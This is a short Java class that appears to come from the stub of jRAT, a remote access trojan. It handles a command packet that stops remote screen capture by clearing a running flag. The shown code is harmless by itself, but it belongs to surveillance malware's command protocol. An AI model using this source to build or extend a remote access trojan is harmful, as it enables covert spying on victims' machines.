package io.jrat.stub.packets.incoming;

import io.jrat.stub.Screen;

public class Packet26StopRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Screen.running = false;
	}

}